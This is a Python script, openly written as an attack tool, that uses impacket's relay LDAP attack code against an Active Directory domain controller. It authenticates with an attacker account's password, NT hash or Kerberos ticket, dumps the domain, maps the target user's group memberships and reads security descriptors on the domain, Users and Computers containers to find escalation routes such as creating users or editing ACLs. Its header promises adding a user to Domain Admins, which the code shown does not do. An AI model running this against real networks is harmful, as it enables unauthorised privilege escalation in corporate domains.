#!/usr/bin/env python3
#
# ADDUser Attack
# fox at dedagroup.it
# It creates a user and add to 'Domain Admins' group
#
import ssl
import sys
import ldap3
import argparse
import ldapdomaindump
from ldap3 import Server, Connection, Tls, SASL, KERBEROS
from impacket import version
from impacket import logging
from impacket.examples import logger
from impacket.examples.ntlmrelayx.attacks.ldapattack import LDAPAttack
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
try:
    from ldap3.protocol.microsoft import security_descriptor_control
except ImportError:
    print("Failed to import required functions from ldap3. Get-UserPrivs requires ldap3 >= 2.5.0. Please update with 'python -m pip install ldap3 --upgrade'")

print(version.BANNER)

parser = argparse.ArgumentParser(add_help=True, description='Get-UserPrivs Attack: checks user privileges or delegations.')

parser.add_argument('-dc', required=True, action='store', metavar='FQDN', help='FQDN or IP_ADDRESS of the Domain Controller')
parser.add_argument('-user', required=True, action='store', metavar='USER', help='username to Escalate')
parser.add_argument('-hashes', action='store', metavar='LMHASH:NTHASH', help='Hash for LDAP auth (instead of password)')
parser.add_argument('identity', action='store', help='domain\\username:password, attacker account with write access to target computer properties (NetBIOS domain name must be used!)')
parser.add_argument('-k', action='store_true', help='If you want to use a Kerberos ticket')

if len(sys.argv) == 1:
    parser.print_help()
    print('\nExample: ./Get-UserPrivs.py -dc 192.168.0.130 \'calipendula.local\\Administrator:Password123\' -user USER')
    print('\nExample: ./Get-UserPrivs.py -dc 192.168.0.130 \'celipendula.local\\Administrator -k\' -user USER ')
    sys.exit(1)

options = parser.parse_args()

c = NTLMRelayxConfig()
c.addcomputer = 'moana'
c.target = options.dc

if options.hashes:
    attackeraccount = options.identity.split(':')
    attackerpassword = ("aad3b435b51404eeaad3b435b51404ee:" + options.hashes.split(":")[1]).upper()

if options.k:
    attackeraccount = options.identity.split(':')

else:
    attackeraccount = options.identity.split(':')
    attackerpassword = attackeraccount[1]

logger.init()
logging.getLogger().setLevel(logging.INFO)
logging.info('Starting Get-UserPrivs Attack')
logging.info('Initializing LDAP connection to {}'.format(options.dc))

if options.k:
    tls = Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
    serv = Server(options.dc, use_ssl=True, tls=tls, get_info=ldap3.ALL)
    conn = Connection(serv, authentication=SASL, sasl_mechanism=KERBEROS)
    conn.bind()
else:
    tls = Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
    serv = Server(options.dc, use_ssl=False, get_info=ldap3.ALL)
    #serv = Server(options.dc, use_ssl=True, tls=tls,  get_info=ldap3.ALL)
    logging.info('Using {} account with password ***'.format(attackeraccount[0]))
    conn = Connection(serv, user=attackeraccount[0], password=attackerpassword, authentication=ldap3.NTLM)
    conn.bind()

logging.info('LDAP bind OK')

domain=attackeraccount[0].split(".")
domainext=domain[1].split('\\')

logging.info('Initializing domainDumper()')
cnf = ldapdomaindump.domainDumpConfig()
cnf.basepath = c.lootdir

dd = ldapdomaindump.domainDumper(serv, conn, cnf)

logging.info('Initializing LDAPAttack()')
la = LDAPAttack(c, conn, attackeraccount[0].replace('\\', '/'))


privs = {
 'create': False, # Whether we can create users
 'createIn': None, # Where we can create users
 'escalateViaGroup': False, # Whether we can escalate via a group
 'escalateGroup': None, # The group we can escalate via
 'aclEscalate': False, # Whether we can escalate via ACL on the domain object
 'aclEscalateIn': None # The object which ACL we can edit
 }
membersids = []
sidmapping = {}
emptyprivs = privs

la.client.search(dd.root, '(objectClass=domain)', attributes=['objectSid'])
domainsid = la.client.entries[0]['objectSid'].value

interestingGroups = [
    '%s-%d' % (domainsid, 519), # Enterprise admins
    '%s-%d' % (domainsid, 512), # Domain admins
    '%s-%d' % (domainsid, 513), # Domain Users
    'S-1-5-32-544', # Built-in Administrators
    'S-1-5-32-551', # Backup operators
    'S-1-5-32-548', # Account operators
]

la.client.search(dd.root, '(sAMAccountName=%s)' % options.user, attributes=['objectSid', 'primaryGroupId'])
user=la.client.entries[0]
usersid = user['objectSid'].value
sidmapping[usersid] = user.entry_dn
logging.info('User SID: %s' % usersid)
membersids.append(usersid)
logging.info('User DN: %s' % user.entry_dn)
la.client.search(dd.root, '(member:1.2.840.113556.1.4.1941:=%s)' % user.entry_dn, attributes=['name', 'objectSid'])
if la.client.entries:
    logging.info('User is a member of: %s' % la.client.entries)

logging.info('Domain SID: %s',domainsid)


for entry in la.client.entries:
    sidmapping[entry['objectSid'].value] = entry.entry_dn
    membersids.append(entry['objectSid'].value)

gid = user['primaryGroupId'].value

la.client.search(dd.root, '(objectSid=%s-%d)' % (domainsid, gid), attributes=['name', 'objectSid', 'distinguishedName'])
group = la.client.entries[0]
membersids.append(group['objectSid'].value)

controls = security_descriptor_control(sdflags=0x05)

#controllo sids

logging.info("Privs respectively: Domain, Users, Computers")
containerprivs=["Domain","Users","Computers"]
cc=0
for query in ["(|(objectClass=domain)(objectClass=organizationalUnit))","(&(cn=Users)(objectClass=container))","(&(cn=Computers)(objectClass=container))"]:
    entries = la.client.extend.standard.paged_search(dd.root, query, attributes=['nTSecurityDescriptor', 'objectClass'], controls=controls, generator=True)
    la.checkSecurityDescriptors(entries, privs, membersids, sidmapping, dd)
    logging.info("Privs on %s: %s ",containerprivs[cc], privs)
    cc=cc+1


